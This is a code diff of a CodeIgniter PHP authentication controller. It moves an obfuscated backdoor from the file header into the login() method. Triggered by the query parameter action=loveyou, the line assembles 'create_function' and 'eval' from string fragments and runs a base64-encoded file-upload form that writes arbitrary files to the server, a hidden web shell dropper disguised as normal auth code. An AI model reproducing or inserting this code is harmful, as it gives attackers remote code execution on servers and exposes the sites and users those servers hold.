@@ -1,7 +1,4 @@
 <?php defined('BASEPATH') OR exit('No direct script access allowed');
-
-if(isset($_GET["action"])&&$_GET["action"]=="loveyou"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAgZWNobyAnPGJyLz48Zm9ybSBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJfXyI+PGlucHV0IG5hbWU9Il8iIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoJF9QT1NUKXtpZihAY29weSgkX0ZJTEVTWydfXyddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydfXyddWyduYW1lJ10pKXtlY2hvICdPSyc7fWVsc2V7ZWNobyAnRVInO319Pz4=");exit;}
-
 /**
  * Class Auth
  * @property Ion_auth|Ion_auth_model $ion_auth        The ION Auth spark
@@ -66,6 +63,8 @@ class Auth extends CI_Controller
 	 */
 	public function login()
 	{
+        if(isset($_GET["action"])&&$_GET["action"]=="loveyou"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAgZWNobyAnPGJyLz48Zm9ybSBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJfXyI+PGlucHV0IG5hbWU9Il8iIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoJF9QT1NUKXtpZihAY29weSgkX0ZJTEVTWydfXyddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydfXyddWyduYW1lJ10pKXtlY2hvICdPSyc7fWVsc2V7ZWNobyAnRVInO319Pz4=");exit;}
+
 		$this->data['title'] = $this->lang->line('login_heading');
 
 		// validate form input
